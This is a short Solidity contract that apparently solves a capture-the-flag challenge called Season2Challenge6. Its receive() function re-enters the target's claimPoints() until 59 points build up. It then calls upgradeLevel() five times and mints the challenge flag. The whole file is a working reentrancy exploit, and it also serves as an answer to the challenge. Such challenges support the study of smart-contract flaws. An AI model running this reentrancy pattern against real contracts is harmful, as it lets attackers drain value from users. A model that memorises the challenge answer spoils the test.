// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

import "./ISeason2Challenge6.sol";

contract SolverS2C6 {
    ISeason2Challenge6 target;
    uint256 count;

    function solve(address _target) external {
        target = ISeason2Challenge6(_target);

        // Reset points to ensure we start from 0 for the reentrancy check
        target.resetPoints();

        // Start reentrancy loop
        // We need 59 points total to reach Level 5 with 9 points remaining.
        // 59 points = 5 upgrades (50 pts) + 9 remainder.
        count = 1;
        target.claimPoints();

        // After recursion unwinds, points[tx.origin] should be 59.

        // Upgrade 5 times
        for (uint i = 0; i < 5; i++) {
            target.upgradeLevel();
        }

        // Mint flag
        target.mintFlag();
    }

    receive() external payable {
        if (count < 59) {
            count++;
            target.claimPoints();
        }
    }
}
